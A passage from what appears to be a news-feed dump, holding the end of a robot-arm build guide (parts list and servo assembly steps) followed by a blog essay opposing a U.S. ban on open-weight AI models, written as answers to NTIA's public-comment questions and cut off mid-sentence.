<td><a href="https://a.co/d/4KEiYdV" rel="nofollow">https://a.co/d/4KEiYdV</a></td>
<td></td>
</tr>
<tr>
<td>Wires</td>
<td>$7</td>
<td><a href="https://a.co/d/hQfk2cb" rel="nofollow">https://a.co/d/hQfk2cb</a></td>
<td></td>
</tr>
</tbody>
</table>
<p dir="auto">There is usually a 10% discount code for the robotis shop. It might also help to add some grip tape to the gripper (e.g. <a href="https://a.co/d/dW7BnEN" rel="nofollow">https://a.co/d/dW7BnEN</a>). A USB-C cable is necessary to connect the servo driver board to a computer.
<a target="_blank" rel="noopener noreferrer" href="https://github.com/AlexanderKoch-Koch/low_cost_robot/blob/main/pictures/follower_arm.png"><img src="https://github.com/AlexanderKoch-Koch/low_cost_robot/raw/main/pictures/follower_arm.png" alt="follower"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Assembly</h2><a id="user-content-assembly" aria-label="Permalink: Assembly" href="#assembly"></a></p>
<p dir="auto">Video of the assembly: <a href="https://youtu.be/RckrXOEoWrk" rel="nofollow">https://youtu.be/RckrXOEoWrk</a></p>
<ol dir="auto">
<li>Print all parts with a 3D printer. The STL files are in hardware/follower/stl. The parts are designed to be easy to print. Only the moving part of the gripper needs supports.</li>
<li>Assemble the arm without the base. Make sure that the servos are fixed in the same position as in the CAD. The servo horn should be in the default position when screwed in.</li>
<li>Solder wires onto voltage reducer. Input should be connected to female connectors and the output to male connectors.</li>
<li>Screw the voltage reducer and the servo driver board onto the base</li>
<li>Screw the base onto the arm</li>
<li>Connect D, V, and G ports on the driver board to the shoulder rotation servo</li>
<li>Connect the shoulder rotation servo to the shoulder lift servo</li>
<li>Connect the input for the voltage reducer to V and G ports on the driver board</li>
<li>Connect the output of the voltage reducer and the remaining D port of the driver board to the elbow servo</li>
<li>Connect the driver board to the power supply</li>
<li>Connect the driver board to a computer (should work with Linux and macOS)</li>
<li>Figure out the device name (e.g. /dev/tty.usbmodem57380045631) <code>ls /dev/tty.*</code></li>
<li>Scan the device with <a href="https://emanual.robotis.com/docs/en/software/dynamixel/dynamixel_wizard2/" rel="nofollow">Dynamixel Wizard</a></li>
<li>Connect to an XL330 servo and view the input voltage. Adjust the screw on the voltage reducer until the input voltage is 5V.</li>
<li>Set the servo ids to 1 for the shoulder to 5 for the gripper servo</li>
<li>Set the baudrate to 1M for all servos.</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">Leader Arm</h2><a id="user-content-leader-arm" aria-label="Permalink: Leader Arm" href="#leader-arm"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Required Materials</h3><a id="user-content-required-materials-1" aria-label="Permalink: Required Materials" href="#required-materials-1"></a></p>
<table>
<thead>
<tr>
<th>Part</th>
<th>Cost</th>
<th>Buying link</th>
<th>Specs</th>
</tr>
</thead>
<tbody>
<tr>
<td>6x Dynamixel xl330-w077</td>
<td>$144</td>
<td><a href="https://www.robotis.us/dynamixel-xl330-m077-t/" rel="nofollow">https://www.robotis.us/dynamixel-xl330-m077-t/</a></td>
<td><a href="https://emanual.robotis.com/docs/en/dxl/x/xl330-m077/" rel="nofollow">https://emanual.robotis.com/docs/en/dxl/x/xl330-m077/</a></td>
</tr>
<tr>
<td>Serial bus servo driver board</td>
<td>$10</td>
<td><a href="https://a.co/d/7C3RUYU" rel="nofollow">https://a.co/d/7C3RUYU</a></td>
<td></td>
</tr>
<tr>
<td>5v Power Supply</td>
<td>$6</td>
<td><a href="https://a.co/d/5u90NVp" rel="nofollow">https://a.co/d/5u90NVp</a></td>
<td></td>
</tr>
<tr>
<td>Table Clamp</td>
<td>$6</td>
<td><a href="https://a.co/d/4KEiYdV" rel="nofollow">https://a.co/d/4KEiYdV</a></td>
<td></td>
</tr>
<tr>
<td>XL330 Frame</td>
<td>$7</td>
<td><a href="https://www.robotis.us/fpx330-s101-4pcs-set/" rel="nofollow">https://www.robotis.us/fpx330-s101-4pcs-set/</a></td>
<td></td>
</tr>
</tbody>
</table>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/AlexanderKoch-Koch/low_cost_robot/blob/main/pictures/leader_arm.png"><img src="https://github.com/AlexanderKoch-Koch/low_cost_robot/raw/main/pictures/leader_arm.png" alt="leader"></a></p>
<p dir="auto">The assembly of the leader arm is simpler since all motors use 5v. The gripper is replace by a handle and a trigger. During use, a small torque can be applied to the trigger so that it opens by default. The GELLO design uses a spring for this purpose but it is much more difficult to assemble.
The teleoperation.py script can be used to test the arms. However, the device names might have to be adjusted.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Banning open weight models would be a disaster (226 pts)]]></title>
            <link>https://rbren.substack.com/p/banning-open-weight-models-would</link>
            <guid>39901978</guid>
            <pubDate>Tue, 02 Apr 2024 03:04:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rbren.substack.com/p/banning-open-weight-models-would">https://rbren.substack.com/p/banning-open-weight-models-would</a>, See on <a href="https://news.ycombinator.com/item?id=39901978">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p><span>In response to an </span><a href="https://www.whitehouse.gov/briefing-room/presidential-actions/2023/10/30/executive-order-on-the-safe-secure-and-trustworthy-development-and-use-of-artificial-intelligence/" rel="nofollow ugc noopener">Executive Order</a><span> from President Biden, The U.S. Department of Commerce (DoC) has asked the public for comments on “Open-Weight AI Models”—models like LLaMa, Stable Diffusion, and Mixtral—which are freely distributed to the public. They are considering blocking access these models in order to prevent abuse.</span></p><p>This would be a terrible mistake.</p><p><span>PSA: You can send the DoC your comments by clicking the “Comment” button </span><a href="https://www.regulations.gov/document/NTIA-2023-0009-0001" rel="nofollow ugc noopener">on regulations.gov</a><span>. Feel free to copy or paraphrase my comments below.</span></p><p>The deadline is March 27, 2024.</p><p>The most sophisticated AI being developed today is closed-source (including, ironically, most of OpenAI’s work). Scientists, engineers, and the public have no view into the inner workings of these algorithms. If we want to use them, we’re forced to enter into a legal and/or financial agreement with the creator. Our activity is tightly restricted and monitored.</p><p>This is mostly normal. Corporations develop new technology, then control its use. ChatGPT’s closed-source nature isn’t meaningfully different from that of Google Search or Snapchat.</p><p>But competitors are on the rise, and many of them are taking a more open approach. Meta, Stability AI, Mistral, and other companies are giving their work away for free, allowing us to run state-of-the-art models on our own hardware, outside the reach of anyone’s oversight or control.</p><p>This, too, is mostly normal. People develop new technology, then give it away for free, since it doesn’t cost anything to distribute. The open nature of Mixtral or LLaMa isn’t meaningfully different from Linux or Signal.</p><p>The only difference with AI, is that AI is immensely powerful. The government is rightfully concerned about what will happen when advanced AI is widely available. </p><p><span>To put it bluntly: closed models allow for centralized control. Open systems, meanwhile, are free from oversight, and any controls can be trivially bypassed (see, e.g. </span><a href="https://www.reddit.com/r/StableDiffusion/comments/wv2nw0/tutorial_how_to_remove_the_safety_filter_in_5/" rel="nofollow ugc noopener">How to Remove Stable Diffusion’s Safety Filter in 5 Seconds</a><span>).</span></p><p>So it’s easy to see why the government might want to prevent the distribution of open models.</p><p>The biggest threats posed by AI come not from individuals, but from corporations and state-level actors. And they will have unfettered access to state-of-the-art AI no matter what.</p><p>Well-funded organizations (e.g. corporations and intelligence agencies) can afford to build and train their own custom models. No matter what regulatory approach the U.S. takes, this is a reality we will have to contend with—at the very least, adversarial governments will be adding advanced AI to their arsenals. We should expect to see a surge in coordinated disinformation campaigns, astroturfing, addiction-driven media, and sophisticated cybersecurity attacks.</p><p>Open models give the public a chance to fight back. Open models allow security researchers, academics, NGOs, and regulatory bodies to experiment with state-of-the-art technology. We can find attack patterns and build technology for detecting and preventing abuse. We can create good AI to combat nefarious AI.</p><p>Open models level the playing field.</p><p><span>Secondarily, banning open models would be a massive impediment to innovation and economic growth. Open models democratize access to AI technology, enabling use cases that are financially unviable with closed models (e.g. a local high school could purchase a single computer to give students unlimited access to an open LLM, but would need to pay perpetual fees to a closed model provider like OpenAI). Open models allow academics and startups to build and distribute new applications, undreamt of by the creators of foundation models. Open models can be easily built into existing workflows and applications (see e.g. community-built integrations for Stable Diffusion in </span><a href="https://github.com/AbdullahAlfaraj/Auto-Photoshop-StableDiffusion-Plugin" rel="nofollow ugc noopener">Photoshop</a><span> and </span><a href="https://github.com/benrugg/AI-Render" rel="nofollow ugc noopener">Blender</a><span>, while DALL-E remains mostly walled off).</span></p><p>AI is not just a new industry, it’s an economic accelerant. Curbing access would exacerbate inequality, and make the U.S. less competitive in the global economy.</p><p>To be sure, some harm will be done by individuals with unfettered access to AI, mostly to other individuals. We will need laws and regulations to mitigate the damage. But these laws should punish people and organizations who abuse AI—they shouldn’t ban access to the technology entirely.</p><p>In general, there are two approaches to social harm: we can disincentivize it through punishment, or we can try to eradicate it through surveillance and control. The former is the norm in free societies, while the latter is a hallmark of oppression.</p><p>A ban on open models might prevent some harm at the individual level, but it would expose us to existential threat at the societal level.</p><p>Here’s an abridged version of the DoC’s summary of their RFC (emphasis mine):</p><blockquote><p><span>Artificial intelligence (AI) has had, and will have, a significant effect on society, the economy, and scientific progress. </span><strong>Many of the most prominent models…are ‘‘fully closed’’ or ‘‘highly restricted,’’</strong><span>…however…an ecosystem of increasingly ‘‘open’’ advanced AI models [is] allowing developers and others to fine-tune models using widely available computing.</span></p><p><strong>[Open models] could play a key role in fostering growth among…[s]mall businesses, academic institutions, underfunded entrepreneurs, and even legacy businesses</strong><span>…The concentration of access to foundation models…poses the risk of hindering such innovation and advancements…These open foundation models have the potential to help scientists make new medical discoveries or even make mundane, time-consuming activities more efficient.</span></p><p><strong>Open foundation models have the potential to transform…medicine, pharmaceutical, and scientific research…</strong></p><p><span>Open foundation models can allow for more transparency and enable broader access to allow greater oversight by technical experts, researchers, academics, and those from the security community…The accessibility of </span><strong>open foundation models also provides tools for individuals and civil society groups to resist authoritarian regimes</strong><span>, furthering democratic values and U.S. foreign policy goals.</span></p><p><span>…</span><strong>open foundation models…may pose risks as well</strong><span>…such as risks to security, equity, civil rights, or other harms due to, for instance, affirmative misuse, failures of effective oversight, or lack of clear accountability mechanisms…The lack of monitoring of open foundation models may worsen existing challenges, for example, by easing </span><strong>creation of synthetic non-consensual intimate images or enabling mass disinformation campaigns</strong><span>.</span></p><p>…the Executive order asks NTIA to consider risks and benefits of dual-use foundation models with weights that are ‘‘widely available.’’…</p></blockquote><p>The National Telecommunications and Information Administration (NTIA) has listed out a few dozen questions to help guide their policy here. They’re mostly great questions, though a few are naive or nonsensical. There are nine major sections:</p><ol><li><p>How should we define “open”?</p></li><li><p>How do the risks compare between open and closed models?</p></li><li><p>What are the benefits of open models?</p></li><li><p>Besides weights, what other components matter?</p></li><li><p>What are the technical issues involved in managing risk?</p></li><li><p>What are the legal and business issues?</p></li><li><p>What regulatory mechanisms can be leveraged?</p></li><li><p>How do we future-proof our strategy?</p></li><li><p>Other issues</p></li></ol><p>Below are my responses, which will be sent to the NTIA via the link at the top of this essay. I’ve bolded the most important questions if you want to skim.</p><blockquote><p>1. How should NTIA define ‘‘open’’ or ‘‘widely available’’ when thinking about foundation models and model weights?</p></blockquote><p>A model is only “widely available” if its weights are available. Training requires access to immense amounts of compute and data, effectively rendering an “open-source, closed-weight” model useless.</p><p>Licensing restrictions can make the availability more or less wide, but enforcing the license is hard. Restrictions are generally respected by risk-averse institutions, but can easily be ignored by individuals and state actors.</p><p>If anyone can download and run the model on their own hardware, the model should be considered “open.”</p><blockquote><p><strong>1a. Is there evidence or historical examples suggesting that weights of models similar to currently-closed AI systems will, or will not, likely become widely available? If so, what are they?</strong></p></blockquote><p>Yes—software always follows this flow, thanks to low marginal cost of distribution. Someone creates something great, keeps it private, and enjoys a temporary monopoly. Eventually, individuals or a would-be competitor release not-quite-as-good open source, in hopes of undercutting that monopoly.</p><p><span>While proprietary software may still find ways to maintain a large market share, the </span><em>technical</em><span> gap between open and closed shrinks over time.</span></p><p>Historical examples include operating systems (Windows → Linux), cloud computing (AWS → Kubernetes), social media (Twitter → Mastodon), and chat (WhatsApp → Signal).</p><blockquote><p>1b. Is it possible to generally estimate the timeframe between the deployment of a closed model and the deployment of an open foundation model of similar performance on relevant tasks? How do you expect that timeframe to change? Based on what variables? How do you expect those variables to change in the coming months and years?</p></blockquote><p>All I can say here is that open models have caught up to GPT incredibly fast. I suspect the gap will remain small. Generally the delay shrinks over time as proprietary knowledge gets distributed.</p><p>Releasing a model openly gives an AI creator a huge competitive advantage, and helps to undercut more capable proprietary models. Given the immense competition in this space, we should expect to see more companies opening their models in an attempt to gain market share.</p><blockquote><p><span>1c. Should ‘‘wide availability’’ of model weights be defined by level of distribution? If so, at what level of distribution (</span><em>e.g., </em><span>10,000 entities; 1 million entities; open publication; etc.) should model weights be presumed to be ‘‘widely available’’? If not, how should NTIA define ‘‘wide availability?’’</span></p></blockquote><p>I don’t think this question makes sense. It’s not clear how you’d even count the number of entities with access to the model, unless the weights are kept closed. </p><p>For example: Meta could force anyone who downloads LLaMa weights to provide an ID and sign a restrictive license, but any bad actor can just break the license, redistribute the weights, etc.</p><p>Or OpenAI could enter into private agreements to share their weights with other trustworthy organizations (e.g. Microsoft), but this is certainly not “wide availability”—even if they have thousands of such agreements.</p><p>“Wide availability” is binary—either anyone can download and run the model, or the model provider gates access, giving it only to highly trustworthy entities.</p><blockquote><p>1d. Do certain forms of access to an open foundation model (web applications, Application Programming Interfaces (API), local hosting, edge deployment) provide more or less benefit or more or less risk than others? Are these risks dependent on other details of the system or application enabling access?</p></blockquote><p>Usage can only be monitored and controlled if the weights are kept closed, and all usage is driven through a networked interface (e.g. a web app or REST API).</p><p>There is no middle-ground between an uncontrolled, freely distributed model, and a fully-controlled closed model.</p><blockquote><p><strong>1d i. Are there promising </strong><em><strong>prospective </strong></em><strong>forms or modes of access that could strike a more favorable benefit-risk balance? If so, what are they?</strong></p></blockquote><p>I could imagine something analogous to the App Store—ostensibly everyone has access, but there’s an application process, and a team of human reviewers have to get involved.</p><p>But gating access to a publishing platform like the App Store is very different from gating a data download—once someone has downloaded the model, that access cannot be revoked. And they can easily redistribute the model, circumventing the review process.</p><p>So again, no—model access is binary.</p><blockquote><p><strong>2. How do the risks associated with making model weights widely available compare to the risks associated with non-public model weights?</strong></p></blockquote><p><span>The potential for abuse is similar in both cases—what differs is </span><em>who</em><span> is able to exploit that potential, and what their goals might be.</span></p><p>With both open and closed models, state and corporate actors will be able to use these models in ways that harm society. Keeping models closed only adds a small barrier here—large organizations have the resources to train their own models using publicly available information. We should expect things like coordinated disinformation campaigns, astroturfing, addiction-driven media, and sophisticated cybersecurity attacks.</p><p>With public models, individual actors enter the fray. Mostly they will cause harm to other individuals, e.g. by generating fake images of private citizens. Public models don’t add additional existential threats to society at large, but will likely cause some additional harm to isolated individuals.</p><blockquote><p>2a. What, if any, are the risks associated with widely available model weights? How do these risks change, if at all, when the training data or source code associated with fine tuning, pretraining, or deploying a model is simultaneously widely available?</p></blockquote><p>Widely available weights allow all individuals to use the technology in any way they want. Distributing source code and other assets empowers that a bit (e.g. making fine-tuning easier), but doesn’t meaningfully change the risk.</p><p>The main risk here is harm to other individuals—e.g. through generated images of private citizens. There’s also a risk of online discourse degrading further than it has already, as generated images and text start to dominate the conversation.</p><blockquote><p><span>2b. Could open foundation models reduce equity in rights and safety-impacting AI systems (</span><em>e.g., </em><span>healthcare, education, criminal justice, housing, online platforms, etc.)?</span></p></blockquote><p>Open models are much more likely to improve equity than to reduce it.</p><p>Low levels of equity are caused by unequal access to technology, opportunity, resources, etc. When large, for-profit entities capture a system, they push the system out of an equitable equilibrium, and into a state where they can capture more profit at the expense of other stakeholders.</p><p>Open models will prevent this sort of oligopoly from forming around AI.</p><blockquote><p><strong>2c. What, if any, risks related to privacy could result from the wide availability of model weights?</strong></p></blockquote><p>The same risks that are present with any publicly available information.</p><p>If private/proprietary data is discovered in a set of weights, the parties hosting the weights (e.g. GitHub) can easily be notified by the same mechanisms available today  (e.g. DMCA notices).</p><p>With an open model, this process will be much more transparent, making compliance more likely. With a closed model, it’s up to the controlling organization how it’s handled.</p><p>We see this pattern today with open and closed source software. Private software companies often choose not to disclose security flaws and breaches. Open source software is forced to disclose, since the code—along with any security patches—is public.</p><blockquote><p>2d. Are there novel ways that state or non-state actors could use widely available model weights to create or exacerbate security risks, including but not limited to threats to infrastructure, public health, human and civil rights, democracy, defense, and the economy?</p></blockquote><p>State-level actors are not much empowered by open models—they have the resources to build and train their own closed models.</p><p><span>Nefarious state-level actors are mostly </span><em>hindered</em><span> by open models, which put security researchers, NGOs, activists, and startups on a level playing field.</span></p><blockquote><p>2d i. How do these risks compare to those associated with closed models?</p></blockquote><p>The risk of state-level abuse is larger if the world only has closed models. Open models give the public tools to fight back against state-level actors.</p><blockquote><p><strong>2d ii. How do these risks compare to those associated with other types of software systems and information resources?</strong></p></blockquote><p>This is a great question. The difference is not one of kind, but of magnitude.</p><p>Encryption technology, security tooling, internet access, etc are all things a government might be tempted to limit the availability of, whether through regulation or export controls. In each case, we completely prevent small actors from accessing the technology, while only inconveniencing large actors.</p><p>AI is more powerful than these technologies, but it follows the same dynamic.</p><blockquote><p>e. What, if any, risks could result from differences in access to widely available models across different jurisdictions?</p></blockquote><p>Making models available in one jurisdiction, but not another, would likely worsen global inequality. But it’s not a difficult regulation to skirt—you only need one person to smuggle the data behind the jurisdiction firewall. And VPNs make that easy.</p><blockquote><p><strong>f. Which are the most severe, and which the most likely risks described in answering the questions above? How do these set of risks relate to each other, if at all?</strong></p></blockquote><p>The most severe risks are societal-level disruptions: coordinated disinformation campaigns, state-scale cybersecurity attacks, AI-enhanced warfare, etc. These are unfortunately likely to happen to some degree. But their magnitude can be mitigated by ensuring security researchers and academics have open access to state-of-the-art models.</p><p>Less severe—but still noteworthy—are those risks that cause individual harm. Generated images of private citizens could hurt reputations and cause psychological damage; LLMs could be used to automatically harass people via social media; people might be duped by fake imagery or fake news sites. These risks are slightly elevated in a world with open models—it becomes easier for individuals to use the software in harmful ways, which might have been blocked by a closed model behind an API.</p><p>So we have a tradeoff: a world with open models entails more individual risk, but less societal risk; a world without open models keeps individuals a bit safer, but puts society as a whole in danger.</p><blockquote><p><strong>3. What are the benefits of foundation models with model weights that are widely available as compared to fully closed models?</strong></p></blockquote><p>The main benefits are:</p><ul><li><p>Greater transparency</p></li><li><p>Better security</p></li><li><p>Lower barriers to innovation</p></li><li><p>Lower barriers to market participation</p></li><li><p>Lower usage costs</p></li><li><p>Better user experiences</p></li><li><p>Lower financial and political inequality</p></li></ul><blockquote><p><strong>a. What benefits do open model weights offer for competition and innovation, both in the AI marketplace and in other areas of the economy?</strong><span> In what ways can open dual-use foundation models enable or enhance scientific research, as well as education/ training in computer science and related fields?</span></p></blockquote><p>Open models greatly reduce the barriers to entry for small- and medium-sized business, academic institutions, and non-profits.</p><p>It takes millions (and soon, potentially billions) of dollars to train a state-of-the-art LLM. Corporations will naturally try to defend their investment, preventing startups from using their models in ways they see as competitive.</p><p>Open models allow any individual or startup to build products, services, and open source projects that leverage AI, and to distribute them without needing permission from a corporate entity.</p><p>As an example, look at the myriad commercial and open source projects that leverage Stable Diffusion, compared to the relatively closed DALL-E. Stable Diffusion has driven far more innovation around in-painting/out-painting, parameter tweaking, animation, etc. The community has incorporated Stable Diffusion into existing image editing software, like Photoshop and Blender, while DALL-E remains mostly walled off.</p><blockquote><p><strong>b. How can making model weights widely available improve the safety, security, and trustworthiness of AI and the robustness of public preparedness against potential AI risks?</strong></p></blockquote><p>Transparency breeds trust.</p><p><span>When AI is made in private, it can be accused of (and is susceptible to) political bias, racial bias, etc—these biases can be inserted intentionally (e.g. by an ideological CEO) or accidentally (e.g. from bias in training data). Bad actors can insert backdoors (aka “</span><a href="https://www.astralcodexten.com/p/ai-sleeper-agents" rel="nofollow ugc noopener">sleeper agents</a><span>”).</span></p><p>Open models, meanwhile, can be examined by researchers. Every change is public and can be audited.</p><p>Furthermore, giving security researchers and academics unfettered access to state-of-the-art models greatly enhances public preparedness for AI risk. We can be informed ahead of time as to how adversarial governments might use AI to disrupt our economy, attack our infrastructure, or undermine democracy. We can develop defensive AI that is able to combat nefarious AI.</p><blockquote><p><strong>c. Could open model weights, and in particular the ability to retrain models, help advance equity in rights and safety- impacting AI systems (</strong><em><strong>e.g., </strong></em><strong>healthcare, education, criminal justice, housing, online platforms etc.)?</strong></p></blockquote><p>Yes. An open model can be retrained by non-profits, NGOs, government agencies, etc in order to address public needs.</p><p>Specifically, an open model can help mine and analyze data relevant to socially beneficial missions. Examples: a social media startup could use an LLM to detect hate and harassment on its platform; a non-profit could use AI to analyze racial disparities in real estate listings; LLMs could help the incarcerated better understand their legal options; a social scientist could use an LLM to mine through city council meeting minutes for signs of corruption.</p><p>If models are kept private, these tasks may or may not be explicitly disallowed by the private entities that control them. Most would be financially unviable. Open models drastically reduce the cost of leveraging the technology, shifting it from a monopolized resource to a commodity.</p><blockquote><p><strong>d. How can the diffusion of AI models with widely available weights support the United States’ national security interests? How could it interfere with, or further the enjoyment and protection of human rights within and outside of the United States?</strong></p></blockquote><p>Open models are a huge benefit to U.S. national security.</p><p>Security researchers and academics can use open models to explore the state-of-the-art without restrictions, making vulnerabilities and attack vectors public knowledge faster than adversarial governments can exploit them. They can develop defensive AI to help us combat abuse. If we limit the ability of these researchers to access and study AI, adversarial governments gain a strategic advantage.</p><p>Internationally, open models put dissidents on a level playing field with their oppressors. For example: an authoritarian government might use generative AI to create propaganda, then spread it on social media. Dissidents might then leverage an open model to distinguish fake photographs from real ones, or to spot patterns of government-generated social media interactions.</p><p>Without access to AI, dissidents are left defenseless.</p><blockquote><p>e. How do these benefits change, if at all, when the training data or the associated source code of the model is simultaneously widely available?</p></blockquote><p>Data and source code can help in fine-tuning models. But the weights are where most of the value is.</p><blockquote><p>4. Are there other relevant components of open foundation models that, if simultaneously widely available, would change the risks or benefits presented by widely available model weights? If so, please list them and explain their impact.</p></blockquote><p>Weights, as well as the code needed to load the weights into a working model, are by far the most important piece. But there are a few other components that are helpful. Roughly in order of importance:</p><ul><li><p>Data: the data used to train the model can be evaluated for statistical bias, or reused in fine-tuning. It can be used to train new, competing models with improved performance.</p></li><li><p>Source code: Any source code beyond what’s needed to run the model itself (e.g. training scripts, deployment configuration, fine-tuning code, etc.) is helpful for folks who want to use or improve the model.</p></li><li><p>Methodology: A human-language description of the model, including motivations in technical choices, tradeoffs made, and references to prior work, can help others improve upon the model.</p></li></ul><blockquote><p>5. What are the safety-related or broader technical issues involved in managing risks and amplifying benefits of dual-use foundation models with widely available model weights?</p></blockquote><p>There are two categories of risk here:</p><ul><li><p>People using the model in nefarious ways</p></li><li><p>People deploying the model in insecure ways, enabling others to abuse the model</p></li></ul><p>Nefarious usage can be mitigated through license agreements, but is hard to enforce at a technical level. Models can be trained not to generate certain types of images or text, but it’s hard to make any guarantees here, and fine-tuning can undo that work.</p><p>Insecure deployment can be mitigated by providing reference code for deployment, security checklists, and add-on software for e.g. detecting attack prompts and harmful output.</p><blockquote><p>a. What model evaluations, if any, can help determine the risks or benefits associated with making weights of a foundation model widely available?</p></blockquote><p><span>Frameworks like the </span><a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/llm-top-10-governance-doc/LLM_AI_Security_and_Governance_Checklist-v1.pdf" rel="nofollow ugc noopener">OWASP LLM Top 10</a><span> are helpful for anyone releasing or deploying an LLM. Much of the advice is applicable to other generative AI systems.</span></p><p><a href="https://arxiv.org/pdf/2302.08500.pdf" rel="nofollow ugc noopener">This paper</a><span> suggests auditing three layers:</span></p><ul><li><p>The governance of the organization creating or disseminating AI</p></li><li><p>The AI model itself</p></li><li><p>The applications that use the AI</p></li></ul><p>For widely available models, the last step becomes harder, as there is no limit to the number and scope of applications. Ideally the disseminating company or a third-party would provide instructions for self-auditing.</p><blockquote><p><strong>b. Are there effective ways to create safeguards around foundation models, either to ensure that model weights do not become available, or to protect system integrity or human well-being (including privacy) and reduce security risks in those cases where weights are widely available?</strong></p></blockquote><p>It’s important to understand that, at a technical level, restricting access to a model is a binary choice.</p><p>If a model is hidden behind a web API, it can be fully controlled by a single entity. Preventing the disclosure of the model’s weights is as trivial as keeping source code private, though there’s always chance of a breach (especially by a motivated state-level actor).</p><p>If the weights are distributed publicly, however, anyone can download and share those weights with others, and can use the model however they see fit. They can modify the model to remove any safeguards, and redistribute those modifications. Any controls can be bypassed, more or less trivially.</p><p><span>You can add restrictions to an open model with a </span><em>license</em><span>, but you can’t enforce those restrictions technically.</span></p><blockquote><p><strong>c. What are the prospects for developing effective safeguards in the future?</strong></p></blockquote><p><span>We might take some inspiration from DRM strategies, and find ways to make it harder to copy and redistribute LLMs. But it’s important to understand that this would only be an </span><em>impediment</em><span>, not a guarantee.</span></p><p>To use a metaphor: it’s like putting a lock on your front door. It’ll keep honest people honest, but a motivated attacker can break a window.</p><p>This is an issue with DRM too: if you let a user watch a video, there’s nothing stopping them from recording that video with a camera and making copies, even if you keep them from the raw data of the original file.</p><p>DRM is moderately successful because the hope is to keep the average person from sharing a file with their friends. But the audience for AI models is small, highly technical, and highly motivated—the value of the model is much higher than the value of a movie. A DRM-like strategy is unlikely to work.</p><blockquote><p><span>d. </span><strong>Are there ways to regain control over and/or restrict access to and/or limit use of weights of an open foundation model</strong><span> that, either inadvertently or purposely, have already become widely available? What are the approximate costs of these methods today? How reliable are they?</span></p></blockquote><p>There are not. The weights represent a very large mathematical equation—once the equation is known, anyone can instantiate it and use it.</p><blockquote><p>e. What if any secure storage techniques or practices could be considered necessary to prevent unintentional distribution of model weights?</p></blockquote><p>The same storage techniques that are used for any high-value intellectual property. Specifically:</p><ul><li><p>Encrypt at rest and in transit</p></li><li><p>Restrict employee access</p></li><li><p>Isolate running models from other workloads</p></li></ul><blockquote><p><strong>f. Which components of a foundation model need to be available, and to whom, in order to analyze, evaluate, certify, or red-team the model?</strong><span> To the extent possible, please identify specific evaluations or types of evaluations and the component(s) that need to be available for each.</span></p></blockquote><p>The more access that’s given, the better the analysis can be. </p><p>At the most restrictive level, gated API access could be given to a penetration tester or analyst. This will allow them to red-team the AI, e.g. attempting prompt injection techniques, attempting to extract personal information, testing for bias and hallucinations, etc.</p><p>Granting a small team access to source code, data, and model weights can improve this testing. The source code can be subjected to static analysis, data can be analyzed for statistical bias, and the model can be probed directly, with different parts isolated or analyzed. This deeper level of access also allows the analyst to understand where certain controls are put in place. E.g. is the model itself trained not to output dangerous text, or is there just a thin layer on top blocking prompts with certain keywords?</p><p>Granting full, public access to all these things is best. It allows unaffiliated teams of researchers and academics to probe the model. For open models, failure patterns and flaws will be discovered and disclosed at a much higher rate.</p><blockquote><p>g. Are there means by which to test or verify model weights? What methodology or methodologies exist to audit model weights and/or foundation models?</p></blockquote><p>There are four dimensions we should audit:</p><ul><li><p>Performance: how well does the model accomplish its intended task?</p></li><li><p>Robustness: how well does the model respond to unexpected inputs?</p></li><li><p>Truthfulness: how often does the model respond with misleading output?</p></li><li><p>Security: how well does the model resist outputting harmful content?</p></li></ul><p>Each of these can be evaluated with automated standards (i.e. a common benchmark) but should also be subject to ad-hoc analysis.</p><blockquote><p>6. What are the legal or business issues or effects related to open foundation models?</p></blockquote><p>Legal issues center on licensing and enforcement, as well as the potential for models to be used in illegal ways.</p><p>Business issues center on usage costs, innovation, competitive advantage, and barriers to market participation.</p><blockquote><p><span>a. In which ways is open-source software policy analogous (or not) to the availability of model weights? </span><strong>Are there lessons we can learn from the history and ecosystem of open-source software</strong><span>, open data, and other ‘‘open’’ initiatives for open foundation models, particularly the availability of model weights?</span></p></blockquote><p>The history of open source software will be highly instructive here. The only difference between AI models and traditional software is how easy it is for a human to introspect the logic.</p><p>In particular, we should expect open models to:</p><ul><li><p>Deliver huge amounts of economic value</p></li><li><p>Allow startups and small companies to compete with large enterprises</p></li><li><p>Complement and support commercial solutions</p></li><li><p>Find large commercial backers, who add value through support and complementary software</p></li><li><p>Set common, industry-wide standards for distribution, deployment, APIs, etc</p></li><li><p>Provide a higher degree of transparency to users and other stakeholders</p></li></ul><blockquote><p><span>b. </span><strong>How, if at all, does the wide availability of model weights change the competition dynamics in the broader economy</strong><span>, specifically looking at industries such as but not limited to healthcare, marketing, and education?</span></p></blockquote><p>Openly available weights will make the market far more competitive and efficient.</p><p>It’s extremely expensive and difficult to train a state-of-the-art model. If all models were kept closed, an oligopoly would form very quickly—similar to the market for cloud computing.</p><p>Furthermore, closed models must run on hardware owned by the distributor (unless there’s a high degree of trust between distributor and licensee). This can be prohibitively expensive for many use cases.</p><p>For example, a local high school could easily make an LLM available to students and teachers by running the LLM on its own hardware; there would only be a fixed, initial cost for purchasing the hardware. But to used a closed LLM, they’d need to pay ongoing licensing fees to the distributor. The same goes for hospitals and other businesses.</p><blockquote><p><span>c. </span><strong>How, if at all, do intellectual property-related issues—such as the license terms under which foundation model weights are made publicly available—influence competition, benefits, and risks?</strong><span> Which licenses are most prominent in the context of making model weights widely available? What are the tradeoffs associated with each of these licenses?</span></p></blockquote><p>License terms are a great way to mitigate the risk of misuse.</p><p>A restrictive license—e.g. that disallows using the model to represent public figures, or to generate violent/sexual imagery—does stop many people from engaging in those behaviors.</p><p>It especially prevents people from making harmful functionality available in a public, user-friendly way, without exposing themselves to litigation.</p><p>That said, restrictive licenses can also reduce competition by disallowing use cases that compete with the creator company. But it’s perfectly within the rights of the creator company to add those kinds of terms (e.g. Meta’s restriction of LLaMa to products with fewer than 700M users).</p><p><span>It’s important to note that restrictive licenses for models work much like they do for open source and entertainment media—they can greatly </span><em>reduce</em><span> the amount of harm, but a bad actor can always ignore them.</span></p><blockquote><p><span>d. Are there concerns about potential barriers to interoperability stemming from different incompatible ‘‘open’’ licenses, </span><em>e.g., </em><span>licenses with conflicting requirements, applied to AI components? Would standardizing license terms specifically for foundation model weights be beneficial? Are there particular examples in existence 